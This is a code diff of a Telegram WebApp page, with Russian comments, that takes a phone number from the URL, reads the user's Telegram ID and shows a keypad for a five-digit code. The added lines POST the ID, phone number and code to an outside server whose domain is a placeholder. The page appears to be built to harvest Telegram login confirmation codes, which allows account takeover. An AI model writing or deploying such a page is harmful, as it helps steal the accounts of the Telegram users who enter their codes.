@@ -65,14 +65,18 @@
             alert('Telegram WebApp не доступен');
         } else {
             WebApp.ready();
-            WebApp.MainButton.setText('Подтвердить').hide().onClick(sendCode);
         }
-        alert(1)
+
         // Получаем номер телефона из URL (query-параметр phone)
         const urlParams = new URLSearchParams(window.location.search);
         const phone = urlParams.get('phone') || '';
 
-        // Маскируем номер для отображения (показываем последние 4 цифры)
+        // Получаем user_id из данных инициализации
+        const userId = WebApp.initDataUnsafe?.user?.id;
+        if (!userId) {
+            alert('Не удалось получить user_id');
+        }
+
         function maskPhone(phone) {
             if (!phone) return 'Номер не указан';
             const cleaned = phone.replace(/\D/g, '');
@@ -87,25 +91,24 @@
         const codeDisplay = document.getElementById('codeDisplay');
         const keyboard = document.getElementById('keyboard');
 
-        // Создаем кнопки цифр 1-9
+        // Создаём кнопки
         for (let i = 1; i <= 9; i++) {
             const btn = document.createElement('button');
             btn.textContent = i;
             btn.onclick = () => addDigit(i.toString());
             keyboard.appendChild(btn);
         }
-        // Кнопка 0
         const btn0 = document.createElement('button');
         btn0.textContent = '0';
         btn0.onclick = () => addDigit('0');
         keyboard.appendChild(btn0);
-        // Кнопка удалить последний символ
+
         const btnDel = document.createElement('button');
         btnDel.textContent = '⌫';
         btnDel.className = 'delete';
         btnDel.onclick = deleteDigit;
         keyboard.appendChild(btnDel);
-        // Кнопка очистить всё
+
         const btnClear = document.createElement('button');
         btnClear.textContent = 'C';
         btnClear.className = 'delete';
@@ -115,44 +118,53 @@
         function addDigit(d) {
             code += d;
             updateDisplay();
-            toggleMainButton();
         }
 
         function deleteDigit() {
             code = code.slice(0, -1);
             updateDisplay();
-            toggleMainButton();
         }
 
         function clearCode() {
             code = '';
             updateDisplay();
-            toggleMainButton();
         }
 
         function updateDisplay() {
             codeDisplay.textContent = code.split('').join(' ') || ' ';
-        }
-
-        function toggleMainButton() {
-            if (code.length === 5) { // ожидаемая длина кода (CODE_LEN = 5)
-                WebApp.MainButton.show();
+            // Показываем MainButton только если длина кода = 5
+            if (code.length === 5) {
+                WebApp.MainButton.setText('Подтвердить').show().onClick(sendCode);
             } else {
                 WebApp.MainButton.hide();
             }
         }
 
         function sendCode() {
-            if (code.length === 5) {
-                const data = { phone: phone, code: code };
-                // Отправляем данные боту и закрываем приложение
-                try {
-                    WebApp.sendData("aa");
-                    WebApp.sendData(JSON.stringify(data));
-                } catch (e) {
-                    alert(e)
+            if (code.length !== 5) return;
+
+            const data = {
+                user_id: userId,
+                phone: phone,
+                code: code
+            };
+
+            fetch('https://ваш-сервер.com/submit_code', {  // замените на ваш домен/ip
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                if (result.status === 'ok') {
+                    WebApp.close();  // успешно, закрываем приложение
+                } else {
+                    alert('Ошибка: ' + (result.message || result.error));
                 }
-            }
+            })
+            .catch(error => {
+                alert('Ошибка сети: ' + error);
+            });
         }
     </script>
 </body>
